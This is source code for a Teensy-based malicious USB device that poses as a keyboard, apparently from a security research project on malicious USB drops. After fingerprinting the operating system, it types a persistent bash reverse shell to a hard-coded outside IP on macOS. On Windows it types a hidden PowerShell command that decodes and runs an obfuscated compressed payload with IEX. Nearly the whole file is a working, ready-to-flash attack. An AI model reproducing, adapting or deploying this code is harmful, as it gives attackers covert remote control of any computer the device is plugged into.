/*
 * Malicious HID USB payload
 * 
 * Malicious chimera HID payload that create a background reverse shell to the server of your choice
 * Works both on Windows and OSX
 * 
 * @see: https://www.elie.net/malusb
 * @authors Elie Bursztein (contact@elie.net),  Jean Michel Picod (jmichel.p@gmail.com)
 * @licence: GPL v3
 */

#include <stdio.h>

/////////////////////////////////////////////////
/// Reverse shell payloads 
/////////////////////////////////////////////////

/*
#define MSF_IP "104.197.171.58"
#define MSF_PORT "443"
#define OSX_PAYLOAD "echo C&C: %s/%s" // first %s is IP, second %s is PORT
//#define OSX_PAYLOAD "(nohup bash -c \"while true;do bash -i >& /dev/tcp/%s/%s 0>&1 2>&1; sleep 1;done\" 1>/dev/null &)"
#define PAYLOAD_OSX_SIZE 2048 // buffer size once the payload is instaniated. 
char payload_osx [PAYLOAD_OSX_SIZE];
*/

const char* OSX_PAYLOAD = "(nohup bash -c \"while true;do bash -i >& /dev/tcp/104.197.171.58/443 0>&1 2>&1; sleep 1;done\" 1>/dev/null &)";

const char* WIN_PAYLOAD  = "powershell -exec bypass -nop -W hidden -noninteractive -Command \"& {$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sICKvRelcAA3Bvd2Vyc2hlbGwudHh0AI1S72vbMBD9Ptj/cBhtyCQWdpbSLeCyzktHoEvDHOiHEIgj32IvshQkOT9o979XShMYDEL1SXd69+7dPU204mgMPL1/RxpVtgJN+pWGLuLpGHfRw/IPcgv5wVhs2BgtyxVfozVsmk0yUaO0NEjiPku+XLPkOmFXn4Nuv//JM5iUcPYDbW41Fo0nnS0PFmfzOVmmMWO92J3nD0/xXwcuUzqzuLcMJVdlLVfzweA2z0aj0FN8c3WGBo+1LNXOwETtUOcVCgG6ldKhoTDQGtQQdAjK7cDfZdFgJwAlz0mumk1rzw8LmanNQderygLNQujFyRX8rLlWRv22kCm9UbqwtZIMbn0njzSg0VFvsWQLuZDBcU72qGuLlJTduEtKdo9yZavwrUNNcqePuji6V/zYL2STwlad4OYy/a6qBVJK6tRhfmFRUrL0kOUZEkIkEWIH9fYO/zU0mh42OHZ7OFs79TKP2oYnra7ke0qGJwdd4kRfe1HrlI7kVq0xGu43biXGyYYoU01TyBJICb2bjwk8w0Nro9dqXyVSsu5cGhgCh9qnlKDWSs/i+X8UxwfGBRaanihFh+zfuGwiLhtm2J1oTeWZ/afkLBPK4Cl8AWMRgWksAwAA'));$t=(New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();IEX $t }\";exit";

/////////////////////////////////////////////////
/// Internal constants
/////////////////////////////////////////////////

#define NUMLOCK 1
#define CAPSLOCK 2
#define SCROLLLOCK 4
#define LED_PIN 11 // Teensy pin for the led.


#define LOCK_KEY CAPSLOCK // Key used for testing end of command execution. NUMLOCK or CAPSLOCK or SCROLLLOCK.
#define LOCK_CHECK_WAIT_MS 100 // Time between lock checks in ms
#define LOCK_ATTEMPTS 10 // attempts to load the driver


#define DELAY 500 // delay between command

/////////////////////////////////////////////////
/// Lock related functions
/////////////////////////////////////////////////

/*!
 * Check the state of the lock key used for locking mechanism.
 */
boolean is_locked(void) {
  if ((keyboard_leds & LOCK_KEY) == LOCK_KEY) {
    return true;
  } else {
    return false;
  }
}


/*!
 * Toggle the selected locked key stats.
 */
void toggle_lock(void) {
  unsigned short k;
  switch(LOCK_KEY) {
    case NUMLOCK:
      k = KEY_NUM_LOCK;
      break;
    case CAPSLOCK:
      k = KEY_CAPS_LOCK;
      break;
    case SCROLLLOCK:
      k = KEY_SCROLL_LOCK;
      break;
    default:
      break;
  }
  set_key(1, k);
  type_keys();
}


/*!
 * reset lock to unlock
 */
void reset_lock(void) {
  if (is_locked()) {
    toggle_lock();
  } 
}

/////////////////////////////////////////////////
/// Utility functions
/////////////////////////////////////////////////

/*
 * Fingerprint OSX vs Win/Linux based on the fact that OSX don't have scrollnum
 * Idea: Try to toggle and if no change then it is OSX else Win or OSX
 */
boolean is_osx() {
  int status1 = 0; //LED status before toggle
  int status2 = 0; //LED status after toggle
  unsigned short sk  = NUMLOCK;
  // Get status
  status1 = ((keyboard_leds & sk) == sk) ? 1 : 0;
  delay(DELAY);

  //Toggle
  set_key(1, sk);
  type_keys();
  
  // Get status
  status2 = ((keyboard_leds & sk) == sk) ? 1 : 0;
  clear_keys();
  is_done();
  
  if (status1 == status2) {
    return true; 
  } else {
    return false;
  }
}


void set_modifier(unsigned short m) {
  Keyboard.set_modifier(m);
}

/*!
 * Set keyboard key values 
 * @param position: the position of the key in [1, 6]
 * @param value: the key value
 */

void set_key(unsigned short position, unsigned short value) {
  switch(position) {
    case 1:
      Keyboard.set_key1(value);
      break;
    case 2:
      Keyboard.set_key2(value);
      break;
    case 3:
      Keyboard.set_key3(value);
      break;
    case 4:
      Keyboard.set_key4(value);
      break;
    case 5:
      Keyboard.set_key5(value);
      break;
    case 6:
      Keyboard.set_key6(value);
      break;
    default:
      break;
  }
}

/*! 
 * Type the given key combination
 * type/write the keys, clear and wait to be succesful 
 * @return if the command succeeded or not
 */
void type_keys(void) {
  Keyboard.send_now();
  clear_keys();
  delay(DELAY);
}

/*! 
 * Type a command line including "ENTER"
 * type/write the keys, clear and wait to be succesful 
 * @return if the command succeeded or not
 */
void type_command(const char* cmd) {  
  Keyboard.print(cmd);
  Keyboard.send_now();
  delay(DELAY);

  Keyboard.println("");
  Keyboard.send_now();
  delay(DELAY * 4);
  clear_keys();
}


/*!
 * clear keyboard 
 * return true if sucessful
 */
void clear_keys (void){
  
  // reset all keys
  for (int i = 1; i < 7; i++)
    set_key(i, 0);
  
  // reset modifier
  set_modifier(0);
  Keyboard.send_now();
  delay(DELAY);
}

/*!
 * Wait until the drivers are load and the teensy active.
 * 
 * The idea behind this is to try to get the onboard light to blink 
 * and then try to lock our lock key. If both succeed then we are ready
 * 
 * @note: Idea from Offsec Peensy code 
 */
void wait_for_drivers(void) {
    //until we are ready 
    for(int i = 0; i < LOCK_ATTEMPTS && (!is_locked()); i++) {
        digitalWrite(LED_PIN, HIGH);
        digitalWrite(LED_PIN, LOW);
        delay(LOCK_CHECK_WAIT_MS);
        toggle_lock();
      }

    // maybe it is seen as a new keyboard, evading
    if (!is_locked()) {
      osx_close_windows();
    }
      
    //reseting lock
    reset_lock();
    delay(100);
}


/*! 
 * Check if a commad is sucessful by testing the lock key
 */
void is_done (void) {
  //for(int i = 0; i < LOCK_ATTEMPTS && (!is_locked()); i++) {
  boolean current_lock = is_locked();
  toggle_lock();
  while(is_locked() == current_lock) {
    delay(LOCK_CHECK_WAIT_MS);
  }
  reset_lock();
}


/////////////////////////////////////////////////
/// Payload functions
/////////////////////////////////////////////////
/*
char* build_payload(const char* payload_template) {
  bzero(payload_osx, PAYLOAD_OSX_SIZE);
  snprintf(payload_osx, PAYLOAD_OSX_SIZE, payload_template, MSF_IP, MSF_PORT);
  return payload_osx;
}
*/

/////////////////////////////////////////////////
/// OSX functions
/////////////////////////////////////////////////

/** open terminal **/
void osx_close_windows(void) {
  set_modifier(MODIFIERKEY_RIGHT_GUI);
  set_key(1, KEY_Q);
  type_keys();
}

/** open spotlight application to launch other apps **/
void osx_open_spotlight(void) {
  set_modifier(MODIFIERKEY_RIGHT_GUI);
  set_key(1, KEY_SPACE);
  type_keys();
}

void osx_hide_windows(void) {
  // minimize background windows
  set_modifier(MODIFIERKEY_RIGHT_GUI | MODIFIERKEY_ALT);
  set_key(1, KEY_H);
  type_keys();

  // minimize active windows
  set_modifier(MODIFIERKEY_RIGHT_GUI | MODIFIERKEY_ALT);
  set_key(1, KEY_M);
  type_keys();

  // minimize active windows
  set_modifier(MODIFIERKEY_RIGHT_GUI | MODIFIERKEY_ALT);
  set_key(1, KEY_M);
  set_key(2, KEY_H);
  type_keys();
}

/** OSX payload delivery **/
void osx_exec_payload(void) {
  //hide all the window
  osx_hide_windows();
  
  //spotlight
  osx_open_spotlight();

  //terminal
  type_command("terminal");

  //payload
  type_command(OSX_PAYLOAD);
  
  //cleanup
  osx_close_windows(); 
}

/////////////////////////////////////////////////
/// Windows functions
/////////////////////////////////////////////////

/*
 * Fingerprinting technique using powershell
 * @credit NFCpowershell -Command "(New-Object -ComObject WScript.Shell).SendKeys('{SCROLLLOCK}')"
 * 
 */
bool fingerprint_windows(void) {
  int status1 = 0; //LED status before toggle
  int status2 = 0; //LED status after toggle
  unsigned short sk  = SCROLLLOCK;
  
  // Get status
  status1 = ((keyboard_leds & sk) == sk) ? 1 : 0;
  delay(DELAY);


  //Asking windows to set SCROLLLOCK
  win_open_execute();
  type_command("powershell -Command \"(New-Object -ComObject WScript.Shell).SendKeys('{SCROLLLOCK}')\"");
  delay(DELAY);
  
  // Get status
  status2 = ((keyboard_leds & sk) == sk) ? 1 : 0;
  is_done();
  
  if (status1 != status2) {
    return true; 
  } else {
    return false;
  }
}


void win_open_execute(void) {
  // Windows key + R
  set_modifier(MODIFIERKEY_GUI);
  set_key(1, KEY_R);
  type_keys();
}

void win_payload(void) {
  // exex prompt
  win_open_execute();
    
  //cmd 
  type_command("cmd");

  //run payload
  type_command(WIN_PAYLOAD);
}

/*
 * Main function
 */
void setup() {
  //wait until the key is up and ready
  wait_for_drivers();
  clear_keys();
  if (fingerprint_windows() == true) {
    win_payload();
  } else {
    osx_exec_payload();
  }
}

/*
 * Code that need to be executed repeatedly goes here
 * @note: not used as payload as one time execution.
 */
void loop() {}
